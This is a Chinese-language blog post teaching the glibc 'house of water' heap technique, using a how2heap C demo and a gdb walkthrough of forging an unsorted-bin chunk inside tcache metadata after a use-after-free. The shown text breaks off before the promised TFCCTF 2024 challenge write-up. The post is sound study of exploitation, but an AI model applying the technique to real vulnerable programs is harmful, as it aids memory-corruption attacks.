<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="house of water早就听 Csome 学长说过有种打法叫 house of water，但是当时没去看，时间久了就忘记这个东西了，现在记起来了就来学习一下。由于笔者的水平有限，文章不免会出现许多错误，希望各位师傅能过包容以及指正。这篇文章的程序的测试环境为 ubuntu 22.04.3 TLS。 概述这个打法由国际战队 blue water 提出的，下面来看看该团队对这个打法的描述：">
<meta property="og:type" content="article">
<meta property="og:title" content="house of water &amp; TFCCTF 2024 MCGUAVA">
<meta property="og:url" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="house of water早就听 Csome 学长说过有种打法叫 house of water，但是当时没去看，时间久了就忘记这个东西了，现在记起来了就来学习一下。由于笔者的水平有限，文章不免会出现许多错误，希望各位师傅能过包容以及指正。这篇文章的程序的测试环境为 ubuntu 22.04.3 TLS。 概述这个打法由国际战队 blue water 提出的，下面来看看该团队对这个打法的描述：">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/2.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/3.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/4.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/5.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/6.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/7.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/8.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/9.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/10.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/11.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/12.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/13.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/14.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/15.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/16.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/17.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/18.png">
<meta property="article:published_time" content="2024-08-05T16:00:00.000Z">
<meta property="article:modified_time" content="2025-01-09T05:50:17.887Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>house of water &amp; TFCCTF 2024 MCGUAVA</title>
    <!-- async scripts -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
    
    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&text=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&is_video=false&description=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=house of water &amp; TFCCTF 2024 MCGUAVA&body=Check out this article: https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&name=house of water &amp; TFCCTF 2024 MCGUAVA&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&t=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-water"><span class="toc-number">1.</span> <span class="toc-text">house of water</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Demo"><span class="toc-number">1.2.</span> <span class="toc-text">Attack Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#house-of-water-c"><span class="toc-number">1.2.1.</span> <span class="toc-text">house_of_water.c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TFCCTF-2024-MCGUAVA"><span class="toc-number">2.</span> <span class="toc-text">TFCCTF 2024 MCGUAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ida%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.1.</span> <span class="toc-text">ida伪代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.0.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%A0%86%E5%9D%97%E7%B4%A2%E5%BC%95"><span class="toc-number">2.0.3.</span> <span class="toc-text">获取堆块索引</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%83%BD%E5%A4%9F%E4%BF%AE%E6%94%B9-unsorted-start-%E5%92%8C-unsorted-end-%E7%9A%84%E5%A0%86%E5%9D%97"><span class="toc-number">2.0.4.</span> <span class="toc-text">获取能够修改 unsorted_start 和 unsorted_end 的堆块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-fake-unsorted-chunk-%E7%9A%84prev-size-%E5%92%8C-size"><span class="toc-number">2.0.5.</span> <span class="toc-text">伪造 fake unsorted chunk 的prev_size 和 size</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.0.6.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        house of water &amp; TFCCTF 2024 MCGUAVA
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-05T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-06</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="house-of-water"><a href="#house-of-water" class="headerlink" title="house of water"></a>house of water</h2><p>早就听 Csome 学长说过有种打法叫 house of water，但是当时没去看，时间久了就忘记这个东西了，现在记起来了就来学习一下。由于笔者的水平有限，文章不免会出现许多错误，希望各位师傅能过包容以及指正。这篇文章的程序的测试环境为 ubuntu 22.04.3 TLS。</p>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>这个打法由国际战队 blue water 提出的，下面来看看该团队对这个打法的描述：</p>
<blockquote>
<p>House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache<br>metadata control primitive, with the added benefit of obtaining a free libc pointer in the<br>t-cache metadata as well.</p>
<p>NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will<br>contain 4 bits of randomness. If you can increment integers, no brutefore is required.</p>
<p>By setting the count of t-cache entries 0x3e0 and 0x3f0 to 1, a “fake” heap chunk header of<br>size “0x10001” is created.</p>
<p>This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked<br>address entries, enabling the creation of a fully functional fake unsorted-bin entry.</p>
<p>The correct size should be set for the chunk, and the next chunk’s prev-in-use bit<br>must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values<br>should be written.</p>
<p>Finally, due to the behavior of allocations from unsorted-bins, once t-cache metadata control<br>is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer<br>to be ready for allocation as well.</p>
<p>Technique &#x2F; house by @udp_ctf - Water Paddler &#x2F; Blue Water </p>
</blockquote>
<p>相信大多数人都没看懂（感觉是我理解力有待提高😭），不过不用着急，接下来我会进行比较详细的讲解。<br>该打法的利用前置条件如下：</p>
<blockquote>
<p>程序存在UAF漏洞<br>程序可以申请住够大的堆块</p>
</blockquote>
<p>这里需要注意的是，完成该打法不需要泄露任何内存地址且不需要任何堆上的溢出<br>最终的效果是能够在 tcache 的链表上留下 libc 的相关地址，并将其申请出来，效果如下：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png" class="" title="我的图图呢">  

<p>当程序开始运行并遇到它的第一个 malloc 时，堆（main arena）将被初始化。默认情况下（libc 2.31+），将分配 0x290 的内存大小来存储 tcache_perthread_struct 结构体，该结构体存储各个不同 size 的 tcache 链表的 chunk 的个数以及最后进入链表的 chunk 的 data 区域地址。 该结构体的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p>我们最终的目的是在这个结构体中的 entries 区域留下 libc 的相关地址，进而让我们能够申请 libc 上的内存</p>
<h3 id="Attack-Demo"><a href="#Attack-Demo" class="headerlink" title="Attack Demo"></a>Attack Demo</h3><p>这里我们选用 how2heap 中的 <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c">house of water</a> 这个例子来解释，这里我做了一些简单的修改，把一些英文段落进行了删除，只留下程序执行代码</p>
<h4 id="house-of-water-c"><a href="#house-of-water-c" class="headerlink" title="house_of_water.c"></a>house_of_water.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 22.04.3 LTS</span></span><br><span class="line"><span class="comment">// gcc -g house_of_water.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="type">void</span> *_ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *fake_size_lsb = <span class="built_in">malloc</span>(<span class="number">0x3d8</span>);</span><br><span class="line">	<span class="type">void</span> *fake_size_msb = <span class="built_in">malloc</span>(<span class="number">0x3e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(fake_size_lsb);</span><br><span class="line">	<span class="built_in">free</span>(fake_size_msb);</span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *metadata = (<span class="type">void</span> *)((<span class="type">long</span>)(fake_size_lsb) &amp; ~(<span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *x[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		x[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *unsorted_start = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *unsorted_middle = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *unsorted_end = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0xf000</span>);		  <span class="comment">// Padding</span></span><br><span class="line">	<span class="type">void</span> *end_of_fake = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Metadata chunk</span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">long</span> *)end_of_fake = <span class="number">0x10000</span>;</span><br><span class="line">	*(<span class="type">long</span> *)(end_of_fake+<span class="number">0x8</span>) = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(x[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x18</span>) = <span class="number">0x31</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(unsorted_start<span class="number">-0x10</span>); <span class="comment">// Create a fake FWD</span></span><br><span class="line">	</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x18</span>) = <span class="number">0x21</span>; </span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(unsorted_end<span class="number">-0x10</span>); <span class="comment">// Create a fake BCK</span></span><br><span class="line">	</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(unsorted_end);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(unsorted_middle);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(unsorted_start);</span><br><span class="line"></span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> *)unsorted_start = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"> </span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> *)(unsorted_end+<span class="number">0x8</span>) = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Next allocation *could* be our faked chunk!</span></span><br><span class="line">	<span class="type">void</span> *meta_chunk = <span class="built_in">malloc</span>(<span class="number">0x288</span>);</span><br><span class="line"></span><br><span class="line">	assert(meta_chunk == (metadata+<span class="number">0x90</span>)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为在编译阶段我们使用了“-g”参数，可以使用gdb在任意行下断点<code>b + 行号</code><br>接下来对这段 demo 进行调试<br>将断点下到第 18 行，此时程序完成的操作如下：<br>申请了 2 个堆块，size 分别为 0x3e0 和 0x3f0，紧接着将其释放掉<br>我们来看看此时的 tcache_perthread_struct 结构体：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/2.png" class="" title="我的图图呢">
<p>可以看到第二个框框的地方的地址就是我们刚才释放的 2 个堆块地址，而第一个框框则是 size 为 0x3e0 和 0x3f0 对应的 tcache 链表 chunk 的个数，然而这个 heapbase+0x88 这个 0x10001 可以作为我们fake chunk 的size，如果我们将这个地方作为 fake chunk 并放入 unsorted bin（后面称这个 chunk 为 fake unsorted chunk），我们就能够在 tcache_perthread_struct 结构体上踩上 libc 的地址。<br>接下来将断点下到第 0x38 行，这期间做的都是堆块申请工作：<br>连续申请了 7 个 0x90 大小的 chunk，然后交替申请 0x90 和 0x20 大小的 chunk。我们最终希望最后申请的 3 个 0x90 大小的chunk 可以进入 unsorted bin，所以每 2 个 chunk 之间都申请一个小堆块来防止他们合并。这里将要进入 unsorted bin 的三个 chunk 分别命名为：unsorted_start、unsorted_middle、unsorted_end。很好理解吧，开始、中间、结束😋<br>最后还申请了一个特别大的 chunk，size 为 0xf0010，后面紧接着一个 size 为 0x20 的小 chunk<br>接着将断点下到第 41 行，这里在最后那个 size 为 0x20 的 chunk 的 fd 位置写上 0x1000，在 bk 位置写上 0x20。</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/3.png" class="" title="我的图图呢">
<p>这样做是为了绕过 unsorted bin的检测。我们回到最初的 fake unsorted chunk 的位置，其起始地址为0x555555559080</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/4.png" class="" title="我的图图呢">
<p>我们需要让这个 chunk 在 unsorted bin 中合法，我们就需要在让这样 fake unsorted chunk 在结束的时候的下个 chunk 的 prev_size 为 0x10000，且 size 的 issue 位为 0（因为 unsorted bin 中的堆块都是已经释放过的未使用的）<br>接下来就是对这个 fake unsorted chunk 进行装修<br>将断点下在第 57 行，此时 bin 的结构如下：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/5.png" class="" title="我的图图呢">
<p>期间做的操作就是将最开始申请的 7 个 0x90 大小的 chunk 给释放掉（将 size 为 0x90 大小的 tcache 链表给填满，确保后面三个 0x90 大小的堆块给释放后能够进入到 unsorted bin），然后在 unsorted_start 和 unsorted_end 上方分别伪造一个小堆块然后释放掉，这里主要讲解一下堆块的伪造<br>对于 unsorted_start 上方堆块的伪造，我们直接在 unsorted_start-0x8 的地方填上 0x31 来当作 fake chunk 的 size 然后直接释放（这个 size 是有讲究的，后面会解释到），unstorted_end 的做法也类似，不过 fake chunk 的大小为 0x20。在将 fake chunk 给释放后由于堆块进入 tcache 链表后 fd+8 的地方会填上一个 key，这个 key 的作用是用来检测 tcache 上是否出现 double free，这个 key 的存在破坏了原先 unsorted_start 和 unsorted_end 这 2 个堆块的 size 位，所以我们要给予恢复，第 50 和 第 56 行的代码的作用就是如此。<br>那么伪造 2 个 fake chunk 然后 释放掉有什么意义呢？<br>我们回到前面，前面说过接下来的操作是为了对要进入 unsorted bin 的  fake unsorted chunk 进行装修，而 unsorted bin 是存在 fd 和 bk 指针的，此时再来看看我们的 fake unsorted chunk</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/6.png" class="" title="我的图图呢">
<p>可以看到 fake chunk 的 fd 和 bk 已经留下我们前面 2 个释放的 fake chunk 的 data 区域地址，同时这个 2 地址<br>也分别是 unsorted_end 和 unsorted_start 这 2 个堆块的地址，这是因为 0x555555559090 这个地址为 tcache_perthread_struct 结构体 entries 链表的起始地址，存放的是最后进入 0x20 大小的 tcache 链表的堆块的地址，而我们最后释放的 2 个 fake chunk 大小分别为 0x20 和 0x30。<br>我们将断点下到第 63 行，期间进行的操作为：依次释放 unsorted_end、unsorted_middle、unsorted_start。bin 的结构如下：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/7.png" class="" title="我的图图呢">
<p>接下来我们的操作是要让我们一开始在 tcache_perthread_struct 中伪造的堆块链入 unsorted bin，这里的操作是将 unsorted_middle 给替换为 fake chunk。回到我们 fake chunk 的那张图片，我们可以看到 fake chunk 的fd 指针已经指向 unsorted_end，bk 指针已经指向 unsorted_start，所以接下来的操作就是令 unsorted_start 的 fd 指针指向 fake unsorted chunk，unsorted_end 的 bk 指针指向 fake unsorted chunk 即可完成 unsorted bin 上堆块替换操作<br>将断点下在第 67 行，期间的操作就是进行上述的指针替换操作，最后的 bin 结构如下：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/8.png" class="" title="我的图图呢">
